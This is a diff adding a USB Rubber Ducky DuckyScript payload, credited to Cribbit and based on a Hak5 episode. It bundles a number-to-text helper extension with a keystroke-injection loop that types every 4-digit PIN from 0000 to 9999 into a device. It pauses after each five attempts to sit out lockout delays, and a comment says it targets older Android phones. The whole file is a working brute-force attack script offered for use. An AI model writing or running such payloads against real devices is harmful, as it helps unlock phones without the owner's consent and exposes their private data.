@@ -1,0 +1,274 @@
+ATTACKMODE HID
+REM TITLE: Brute Force 
+REM AUTHOR: Cribbit
+REM DESCRIPTION: Updated Version of Hak5 episode 1217.1
+REM VID URL: https://www.youtube.com/watch?v=yoYiEkk5TyI
+REM NOTE: This is 10 year old so will not work with modern android
+REM PROPS: Hak5Darren
+DELAY 3000
+
+EXTENSION TRANSLATE
+    REM VERSION 1.0
+
+    REM This extension acts as a library or collection of helper functions
+    REM to work with converting variables in your payloads.
+    REM WHY:
+    REM Of the many ways to get information about the state of your payload 
+    REM is by injecting static strings effectively as debugging prints
+    REM However, given the non-static nature of payloads using variables in
+    REM DuckyScript 3.0 - the ability to decode variables during payload 
+    REM execution and print (inject) representations of their current state 
+    REM can often be a critically helpful development and debugging tool.
+
+    REM Available Functions:
+    REM TRANSLATE_INT() - var to decimal string - set $INPUT prior to call
+    REM TRANSLATE_HEX() - var to hexidecimal string - set $INPUT prior to call
+    REM TRANSLATE_BINARY() - var to binary string - set $INPUT prior to call
+    REM TRANSLATE_BOOL() - var to boolean string - set $INPUT prior to call
+
+    REM USAGE:
+    REM set $INPUT to desired var
+    REM call the correct translate_ function for the expected data type e.g.
+    REM    VAR $myVar = 1234
+    REM    $INPUT = $myVar
+    REM    TRANSLATE_INT()
+    REM    REM the above code will inject 1234
+
+    REM begin extension variables
+    DEFINE PRINT_INT 0
+    DEFINE PRINT_HEX 1
+    VAR $DIGIT_PRINT_MODE = PRINT_INT
+    VAR $D = 0
+    VAR $IN = 0
+    VAR $INPUT = 0
+    VAR $MOD = 0
+    VAR $P = FALSE
+    VAR $NL = TRUE
+    REM end extension variables
+
+    REM REQUIRED for INT/HEX - convert int to char
+    FUNCTION PRINTDIGIT()
+        IF ($D == 0) THEN
+            STRING 0
+        ELSE IF ($D == 1) THEN
+            STRING 1
+        ELSE IF ($D == 2) THEN
+            STRING 2
+        ELSE IF ($D == 3) THEN
+            STRING 3
+        ELSE IF ($D == 4) THEN
+            STRING 4
+        ELSE IF ($D == 5) THEN
+            STRING 5
+        ELSE IF ($D == 6) THEN
+            STRING 6
+        ELSE IF ($D == 7) THEN
+            STRING 7
+        ELSE IF ($D == 8) THEN
+            STRING 8
+        ELSE IF ($D == 9) THEN
+            STRING 9
+        ELSE IF ($DIGIT_PRINT_MODE == PRINT_HEX) THEN
+            IF ($D == 10) THEN
+                STRING A
+            ELSE IF ($D == 11) THEN
+                STRING B
+            ELSE IF ($D == 12) THEN
+                STRING C
+            ELSE IF ($D == 13) THEN
+                STRING D
+            ELSE IF ($D == 14) THEN
+                STRING E
+            ELSE IF ($D == 15) THEN
+                STRING F
+            END_IF
+        ELSE
+            STRING ?
+        END_IF
+    END_FUNCTION
+
+    REM REQUIRED for INT/HEX- consumes a character / place from the input
+    FUNCTION CONSUME()
+        $D = 0
+        WHILE ($INPUT >= $MOD)
+            $D = ($D + 1)
+            $INPUT = ($INPUT - $MOD)
+        END_WHILE
+        IF (($D > 0) || ($P == TRUE)) THEN
+            $P = TRUE
+            PRINTDIGIT()
+        END_IF
+    END_FUNCTION
+
+    REM ENDIAN SWAPPER helper, (useful for working with VID/PID)
+    FUNCTION SWAP_ENDIAN()
+        $INPUT = ((($INPUT >> 8) & 0x00FF) | (($INPUT << 8) & 0xFF00))
+    END_FUNCTION
+
+    REM Translates a variable of presumed integer type and attempts to convert
+    REM and inject a DECIMAL string representation
+    FUNCTION TRANSLATE_INT() 
+        $DIGIT_PRINT_MODE = PRINT_INT
+        $P = FALSE
+        IF ( $INPUT >= 10000) THEN
+            $MOD = 10000
+            CONSUME()
+        END_IF
+        IF (($INPUT >= 1000) || ($P == TRUE)) THEN
+            $MOD = 1000
+            CONSUME()
+        END_IF
+        IF (($INPUT >= 100) || ($P == TRUE)) THEN
+            $MOD = 100
+            CONSUME()
+        END_IF
+        IF (($INPUT >= 10) || ($P == TRUE)) THEN
+            $MOD = 10
+            CONSUME()
+        END_IF()
+        $D = $INPUT
+        PRINTDIGIT()
+        IF $NL THEN
+            ENTER
+        END_IF
+    END_FUNCTION
+
+    REM Translates a variable of presumed boolean type and attempts to convert
+    REM and inject a BOOLEAN string representation
+    FUNCTION TRANSLATE_BOOL()
+        IF $INPUT THEN
+            STRING TRUE
+        ELSE
+            STRING FALSE
+        END_IF
+        IF $NL THEN
+            ENTER
+        END_IF
+    END_FUNCTION
+
+    REM Translates a variable of presumed integer type and attempts to convert
+    REM and inject a HEX string representation
+    FUNCTION TRANSLATE_HEX()
+        $DIGIT_PRINT_MODE = PRINT_HEX
+        VAR $chars = 0
+        VAR $d1 = 0
+        VAR $d2 = 0
+        VAR $d3 = 0
+        VAR $d4 = 0
+        WHILE ($INPUT > 0)
+            IF ($chars == 0) THEN
+                $d1 = ($INPUT % 16)
+            ELSE IF ($chars == 1) THEN
+                $d2 = ($INPUT % 16)
+            ELSE IF ($chars == 2) THEN
+                $d3 = ($INPUT % 16)
+            ELSE IF ($chars == 3) THEN
+                $d4 = ($INPUT % 16)
+            END_IF
+            $chars = ($chars + 1)
+            $INPUT = ($INPUT / 16)
+        END_WHILE
+        VAR $i = 0
+        STRING 0x
+        IF ($chars == 0) THEN
+            STRING 0x0000
+        ELSE IF ($chars == 1) THEN
+            STRING 000
+            $D = $d1
+            PRINTDIGIT()
+        ELSE IF ($chars == 2) THEN
+            STRING 00
+            $D = $d2
+            PRINTDIGIT()
+            $D = $d1
+            PRINTDIGIT()
+        ELSE IF ($chars == 3) THEN
+            STRING 0
+            $D = $d3
+            PRINTDIGIT()
+            $D = $d2
+            PRINTDIGIT()
+            $D = $d1
+            PRINTDIGIT()
+        ELSE IF ($chars == 4) THEN
+            STRING 0
+            $D = $d4
+            PRINTDIGIT()
+            $D = $d3
+            PRINTDIGIT()
+            $D = $d2
+            PRINTDIGIT()
+            $D = $d1
+            PRINTDIGIT()
+        END_IF
+        IF $NL THEN
+            ENTER
+        END_IF
+    END_FUNCTION
+
+    REM Translates a variable of presumed integer type and attempts to convert
+    REM and inject a BINARY string representation
+    FUNCTION TRANSLATE_BINARY()
+        VAR $I = 16
+        WHILE ( $I > 0 )
+            $I = ($I - 1)
+            IF (($INPUT & 0x8000) == 0 ) THEN
+                STRING 0
+            ELSE
+                STRING 1
+            END_IF
+            $INPUT = ($INPUT << 1)
+        END_WHILE
+        IF $NL THEN
+            ENTER
+        END_IF
+    END_FUNCTION
+END_EXTENSION
+
+REM Turn off TRANSLATE newline
+$NL = FALSE
+VAR $Frist = 0
+VAR $Second = 0
+VAR $Third = 0
+VAR $Forth = 0
+VAR $WaitTime = 30000
+VAR $WaitStep = 5000
+VAR $WaitDiff = 0
+VAR $Cnt = 0
+
+WHILE ($Frist < 10)
+    $Second = 0
+    WHILE ($Second < 10)
+        $Third = 0
+        WHILE ($Third < 10)
+            $Forth = 0
+            WHILE ($Forth < 10)
+                $INPUT = $Frist
+                TRANSLATE_INT()
+                $INPUT = $Second
+                TRANSLATE_INT()
+                $INPUT = $Third
+                TRANSLATE_INT()
+                $INPUT = $Forth
+                TRANSLATE_INT()
+                $Forth = ($Forth + 1)
+                DELAY 1000
+                ENTER
+                ENTER
+                $Cnt = ($Cnt + 1)
+                IF ($Cnt == 5) THEN
+                    $Cnt = 0
+                    WHILE ($WaitDiff < $WaitTime)
+                        DELAY $WaitStep
+                        ENTER
+                        $WaitDiff = ($WaitDiff + $WaitStep)
+                    END_WHILE
+                    $WaitDiff = 0
+                END_IF
+            END_WHILE
+            $Third = ($Third + 1)
+        END_WHILE
+        $Second = ($Second + 1)
+    END_WHILE
+    $Frist = ($Frist + 1)
+END_WHILE
